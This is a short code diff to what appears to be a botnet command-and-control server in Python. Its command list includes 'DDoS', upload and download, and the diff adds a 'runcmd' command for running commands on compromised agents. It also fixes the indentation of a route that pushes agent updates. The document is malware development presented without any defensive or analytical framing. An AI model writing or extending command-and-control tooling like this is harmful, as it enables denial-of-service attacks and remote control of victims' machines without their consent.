@@ -5,7 +5,7 @@ import requests
 
 SLPort = "8888"
 
-avail_commands = ["Standby", "DDoS", "pwd", "ls", "cd", "upload", "download"]
+avail_commands = ["Standby", "DDoS", "pwd", "ls", "cd", "upload", "download", "runcmd"]
 
 current_command = "pwd"
 extra = "/"
@@ -63,12 +63,12 @@ def get_command():
 @app.route('/update_agent', methods = ['GET'])
 def update_agent():
 	fin = open(agent_name, 'rb')
-    files = {'file': fin}
-    try:
-        r = requests.post(url, files=files)
-        print (r.text)
-    finally:
-        fin.close()
+	files = {'file': fin}
+	try:
+	    r = requests.post(url, files=files)
+	    print (r.text)
+	finally:
+	    fin.close()
 
 
 if __name__ == "__main__":
